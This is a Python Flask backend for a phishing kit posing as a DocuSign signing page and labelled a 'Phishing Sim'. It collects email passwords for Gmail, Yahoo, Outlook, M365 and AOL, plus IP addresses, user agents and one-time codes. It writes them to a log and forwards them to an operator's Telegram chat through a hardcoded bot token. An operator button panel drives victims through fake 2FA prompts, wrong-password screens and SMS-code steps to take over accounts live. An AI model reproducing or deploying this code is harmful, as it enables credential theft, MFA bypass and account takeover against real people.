#!/usr/bin/env python3
"""
DocuSign Phishing Sim — Backend API (Webhook Mode)
Deploy on Render — Pure requests-based Telegram integration
"""

import json, logging, datetime, hashlib, threading, time, random, os
from flask import Flask, request, jsonify, send_from_directory, make_response
import requests as http_req

# ─── CONFIG ───
TELEGRAM_BOT_TOKEN = "8868268134:AAHTVlyTE0ksIwGG75SWEKg-qbUGd8wHE3s"
TELEGRAM_CHAT_ID = "8337327707"
LOG_FILE = "captured.log"

API_BASE = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

app = Flask(__name__)

gmail_sessions = {}
gmail_sessions_lock = threading.Lock()

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)


# ─── CORS ───
@app.after_request
def add_cors_headers(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    return response


# ─── REAL IP ───
def get_real_ip():
    """
    Get the real client IP behind Render's nginx reverse proxy.
    Render puts the real IP in X-Forwarded-For header.
    """
    forwarded = request.headers.get("X-Forwarded-For", "")
    if forwarded:
        real_ip = forwarded.split(",")[0].strip()
        # Ignore private/proxy IPs
        if real_ip and not real_ip.startswith(("10.", "172.16.", "192.168.", "127.")):
            return real_ip
    # Fallback
    return request.remote_addr


# ─── TELEGRAM HELPERS ───
def tg_send_message(text, reply_markup=None, parse_mode=None):
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text}
    if parse_mode: payload["parse_mode"] = parse_mode
    if reply_markup: payload["reply_markup"] = json.dumps(reply_markup)
    try:
        r = http_req.post(f"{API_BASE}/sendMessage", json=payload, timeout=15)
        result = r.json()
        if result.get("ok"):
            msg_id = result["result"]["message_id"]
            logger.info(f"✅ TG sent: msg_id={msg_id}, preview={text[:60]}...")
            return msg_id
        else:
            logger.error(f"❌ TG send failed: {result}")
            return None
    except Exception as e:
        logger.error(f"❌ TG send error: {e}", exc_info=True)
        return None


def tg_edit_message(message_id, text, reply_markup=None, parse_mode=None):
    payload = {"chat_id": TELEGRAM_CHAT_ID, "message_id": message_id, "text": text}
    if parse_mode: payload["parse_mode"] = parse_mode
    if reply_markup: payload["reply_markup"] = json.dumps(reply_markup)
    try:
        r = http_req.post(f"{API_BASE}/editMessageText", json=payload, timeout=15)
        return r.json().get("ok", False)
    except Exception as e:
        logger.error(f"❌ TG edit error: {e}")
        return False


def tg_answer_callback(callback_query_id):
    try:
        r = http_req.post(f"{API_BASE}/answerCallbackQuery",
                          json={"callback_query_id": callback_query_id}, timeout=10)
        return r.json().get("ok", False)
    except Exception as e:
        logger.error(f"❌ TG answer callback error: {e}")
        return False


def inline_kb(rows):
    return {"inline_keyboard": rows}


def btn(text, callback_data):
    return {"text": text, "callback_data": callback_data}


# ─── TELEGRAM WEBHOOK ───
@app.route(f"/webhook/{TELEGRAM_BOT_TOKEN}", methods=["POST"])
def telegram_webhook():
    try:
        data = request.get_json(force=True)
        logger.info(f"Webhook: update_id={data.get('update_id')}, type={list(data.keys())}")

        if "callback_query" in data:
            handle_cb(data["callback_query"])
        elif "message" in data:
            handle_msg(data["message"])

        return jsonify({"ok": True})
    except Exception as e:
        logger.error(f"Webhook error: {e}", exc_info=True)
        return jsonify({"ok": False}), 500


def handle_msg(msg_data):
    chat_id = msg_data.get("chat", {}).get("id")
    text = msg_data.get("text", "")
    if str(chat_id) != TELEGRAM_CHAT_ID:
        return

    if text == "/status":
        with gmail_sessions_lock:
            active = {k: v for k, v in gmail_sessions.items() if v.get("action") not in ("success", "cancelled")}
        if not active:
            tg_send_message("No active Gmail sessions.")
        else:
            lines = [f"Active: {len(active)}"]
            for sid, s in active.items():
                lines.append(f"• {s['email']} → {s.get('stage','?')} ({sid[:6]}...)")
            tg_send_message("\n".join(lines))
    elif text == "/id":
        tg_send_message(f"Chat ID: {chat_id}")
    elif text == "/webhook_info":
        try:
            r = http_req.get(f"{API_BASE}/getWebhookInfo", timeout=10)
            info = r.json().get("result", {})
            tg_send_message(
                f"URL: {info.get('url','N/A')}\n"
                f"Pending: {info.get('pending_update_count','?')}\n"
                f"Allowed: {info.get('allowed_updates','N/A')}\n"
                f"Error: {info.get('last_error_message','None')}"
            )
        except Exception as e:
            tg_send_message(f"Error: {e}")


def handle_cb(query):
    cb_data = query["data"]
    mid = query["message"]["message_id"]
    cq_id = query["id"]

    try:
        tg_answer_callback(cq_id)

        if cb_data.startswith("yes:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid not in gmail_sessions:
                    tg_send_message(f"⚠️ Session {sid} not found")
                    return
                s = gmail_sessions[sid]
                logger.info(f"✅ Yes clicked for {s['email']} — showing 2FA grid")
                s["action"] = "2fa_grid"
                s["stage"] = "awaiting_2fa"
                kb_rows = []
                row = []
                for i in range(10, 100):
                    row.append(btn(str(i), f"2fa:{sid}:{i}"))
                    if len(row) == 9:
                        kb_rows.append(row); row = []
                if row: kb_rows.append(row)
                kb_rows.append([btn("❌ Cancel", f"cancel:{sid}")])
                tg_edit_message(mid, "🔐 Select 2FA phone number ending:", inline_kb(kb_rows))

        elif cb_data.startswith("2fa:"):
            parts = cb_data.split(":")
            sid, digit = parts[1], parts[2]
            with gmail_sessions_lock:
                if sid not in gmail_sessions:
                    tg_send_message(f"⚠️ Session {sid} not found"); return
                s = gmail_sessions[sid]
                s["phone"] = digit
                s["action"] = "show_prompt"
                s["stage"] = "prompt_shown"
                logger.info(f"📱 2FA digit selected: {digit} for {s['email']}")
                markup = inline_kb([[btn("✅ User Authorized", f"authorized:{sid}")]])
                tg_edit_message(mid, f"✅ 2FA selected: ••••{digit}\n\nWaiting for Authorized click...", markup)

        elif cb_data.startswith("authorized:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid not in gmail_sessions:
                    tg_send_message(f"⚠️ Session {sid} not found"); return
                s = gmail_sessions[sid]
                code1 = f"{random.randint(100000, 999999)}"
                s["sms1"] = code1
                s["action"] = "sms1"
                s["stage"] = "sms1"
                logger.info(f"📱 SMS1 generated for {s['email']}: {code1}")
                markup = inline_kb([
                    [btn("📱 Send SMS II", f"sms2:{sid}")],
                    [btn("🔄 Resend SMS I", f"resend1:{sid}")]
                ])
                tg_edit_message(mid, f"📱 SMS Code I: `{code1}`\n\nSend SMS Code II?", markup, parse_mode="Markdown")

        elif cb_data.startswith("sms2:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid not in gmail_sessions:
                    tg_send_message(f"⚠️ Session {sid} not found"); return
                s = gmail_sessions[sid]
                code2 = f"{random.randint(100000, 999999)}"
                s["sms2"] = code2
                s["action"] = "sms2"
                s["stage"] = "sms2"
                markup = inline_kb([[btn("✅ Complete", f"success:{sid}")]])
                tg_edit_message(mid, f"📱 SMS Code II: `{code2}`\n\nBoth sent. Complete?", markup, parse_mode="Markdown")

        elif cb_data.startswith("resend1:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid not in gmail_sessions:
                    tg_send_message(f"⚠️ Session {sid} not found"); return
                c = f"{random.randint(100000, 999999)}"
                gmail_sessions[sid]["sms1"] = c
                tg_send_message(f"🔄 SMS I resent: `{c}`", parse_mode="Markdown")

        elif cb_data.startswith("success:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid not in gmail_sessions:
                    tg_send_message(f"⚠️ Session {sid} not found"); return
                s = gmail_sessions[sid]
                s["action"] = "success"
                s["stage"] = "done"
                logger.info(f"✅ Session complete: {s['email']}")
                tg_edit_message(mid,
                    f"✅ COMPLETE — {s['email']}\n\n"
                    f"Email: {s['email']}\nPassword: {s['password']}\n"
                    f"Phone: ••••{s.get('phone','N/A')}\n"
                    f"SMS I: {s.get('sms1','N/A')}\nSMS II: {s.get('sms2','N/A')}")

        elif cb_data.startswith("cancel:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid in gmail_sessions:
                    gmail_sessions[sid]["action"] = "cancelled"
                    gmail_sessions[sid]["stage"] = "cancelled"
                tg_edit_message(mid, "❌ Session cancelled.")

        elif cb_data.startswith("pw_error:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid in gmail_sessions:
                    gmail_sessions[sid]["action"] = "pw_error"
                    gmail_sessions[sid]["stage"] = "pw_error"
                tg_edit_message(mid, "🔑 Showing 'Wrong Password'.")

        elif cb_data.startswith("no:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid in gmail_sessions:
                    gmail_sessions[sid]["action"] = "denied"
                    gmail_sessions[sid]["stage"] = "denied"
                tg_edit_message(mid, "❌ Access Denied — user redirected.")

    except Exception as e:
        logger.error(f"CB error: {e}", exc_info=True)


# ─── SERVE LANDING PAGE ───
@app.route("/")
def serve_landing():
    return send_from_directory(".", "index.html")


# ─── API ───
@app.route("/setup_webhook", methods=["POST"])
def setup_webhook():
    data = request.json
    url = data.get("url", "")
    if not url:
        return jsonify({"error": "Provide url"}), 400

    webhook_url = f"{url.rstrip('/')}/webhook/{TELEGRAM_BOT_TOKEN}"

    try:
        del_resp = http_req.get(f"{API_BASE}/deleteWebhook",
                                params={"drop_pending_updates": True}, timeout=15)
        set_resp = http_req.post(f"{API_BASE}/setWebhook", json={
            "url": webhook_url,
            "allowed_updates": ["message", "callback_query"],
            "drop_pending_updates": True,
            "max_connections": 40
        }, timeout=15)
        time.sleep(2)
        info_resp = http_req.get(f"{API_BASE}/getWebhookInfo", timeout=15)
        info = info_resp.json().get("result", info_resp.json())
        return jsonify({"delete_result": del_resp.json(), "set_result": set_resp.json(),
                        "webhook_url": webhook_url, "webhook_info": info})
    except Exception as e:
        logger.error(f"Webhook setup error: {e}", exc_info=True)
        return jsonify({"error": str(e)}), 500


@app.route("/api/creds", methods=["POST", "OPTIONS"])
def capture():
    if request.method == "OPTIONS":
        return make_response("", 204)

    data = request.json
    provider = data.get("provider", "unknown")
    email = data.get("email", "")
    password = data.get("password", "")
    ip = get_real_ip()  # ← FIXED: real IP
    ua = request.headers.get("User-Agent", "unknown")

    session_id = hashlib.md5(f"{time.time()}{random.random()}{email}".encode()).hexdigest()[:12]

    entry = {"timestamp": datetime.datetime.utcnow().isoformat(), "provider": provider,
             "email": email, "password": password, "ip": ip, "ua": ua, "session": session_id}
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

    logger.info(f"Captured creds: {provider} / {email} / IP={ip} / session={session_id}")

    if provider == "gmail":
        with gmail_sessions_lock:
            gmail_sessions[session_id] = {
                "email": email, "password": password, "ip": ip, "ua": ua,
                "action": "waiting", "stage": "new",
                "phone": None, "sms1": None, "sms2": None
            }

        tg_send_message(
            f"[+]___ Document Sign (GMAIL) ___[+]\n"
            f"You have a new website form submission \n"
            f"IP Address: {ip}\n"
            f"Id: gmail\n"
            f"Email: {email}\n"
            f"Password: {password}\n"
            f"UA: {ua}"
        )

        tg_send_message(
            f"🔔 GMAIL — {email}\nPassword: {password}\nSession: {session_id}",
            reply_markup=inline_kb([
                [btn("✅ Yes", f"yes:{session_id}"), btn("❌ No", f"no:{session_id}")],
                [btn("🔑 Password Error", f"pw_error:{session_id}")]
            ])
        )

        return jsonify({"session": session_id, "action": "waiting"})

    else:
        pid = {"yahoo": "yahoo", "outlook": "outlook", "m365": "m365", "aol": "aol"}.get(provider, provider)
        tg_send_message(
            f"[+]___ Document Sign ___[+]\n"
            f"You have a new website form submission \n"
            f"IP Address: {ip}\n"
            f"Id: {pid}\n"
            f"Email: {email}\n"
            f"Password: {password}"
        )
        return jsonify({"session": session_id, "action": "check_provider"})


@app.route("/api/gmail/status/<session_id>")
def gmail_status(session_id):
    """
    Gmail: frontend polls this.
    Returns 'waiting' by default (stays on loading screen).
    Only returns 'redirect' if explicitly cancelled.
    """
    with gmail_sessions_lock:
        if session_id not in gmail_sessions:
            logger.warning(f"Session {session_id} not found — defaulting to waiting")
            return jsonify({"action": "waiting"})  # ← FIXED: stay on loading instead of redirecting

        s = gmail_sessions[session_id]
        action = s.get("action", "waiting")
        logger.info(f"Status check: {session_id[:8]}... → {action}")

    # Normal flow actions
    if action == "waiting":
        return jsonify({"action": "waiting"})
    elif action == "2fa_grid":
        # Still waiting for operator to pick a number — stay on loading
        return jsonify({"action": "waiting"})
    elif action == "show_prompt":
        return jsonify({"action": "show_prompt", "phone": s.get("phone", "XX")})
    elif action == "authorized":
        # Transitioning — still waiting
        return jsonify({"action": "waiting"})
    elif action == "pw_error":
        return jsonify({"action": "pw_error"})
    elif action == "denied":
        return jsonify({"action": "denied"})
    elif action == "sms1":
        return jsonify({"action": "sms", "code": s.get("sms1", "000000"), "num": 1})
    elif action == "sms2":
        return jsonify({"action": "sms", "code": s.get("sms2", "000000"), "num": 2})
    elif action == "success":
        return jsonify({"action": "success"})
    elif action == "cancelled":
        return jsonify({"action": "redirect", "url": "https://accounts.google.com"})

    # Fallback — don't redirect, keep waiting
    return jsonify({"action": "waiting"})


@app.route("/api/gmail/authorize/<session_id>", methods=["POST"])
def gmail_authorize(session_id):
    with gmail_sessions_lock:
        if session_id in gmail_sessions:
            gmail_sessions[session_id]["action"] = "authorized"
            email = gmail_sessions[session_id]["email"]
            tg_send_message(f"✅ User clicked 'Authorized' for {email}")
        else:
            return jsonify({"status": "error", "message": "session not found"}), 404
    return jsonify({"status": "ok"})


@app.route("/api/otp", methods=["POST"])
def capture_otp():
    data = request.json
    otp = data.get("otp", "")
    provider = data.get("provider", "unknown")
    session_id = data.get("session", "unknown")
    ip = get_real_ip()  # ← FIXED: real IP

    entry = {"timestamp": datetime.datetime.utcnow().isoformat(), "event": "otp",
             "provider": provider, "otp": otp, "ip": ip, "session": session_id}
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

    logger.info(f"OTP: {provider} / {otp} / session={session_id} / IP={ip}")

    tg_send_message(f"[+]___ OTP Code ___[+]\nId: {provider}\nOTP: {otp}")

    return jsonify({"status": "ok"})


@app.route("/health")
def health_check():
    with gmail_sessions_lock:
        count = len(gmail_sessions)
    return jsonify({"status": "ok", "sessions": count})


# ─── START ───
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    logger.info(f"Starting on 0.0.0.0:{port}")
    app.run(host="0.0.0.0", port=port, debug=False)
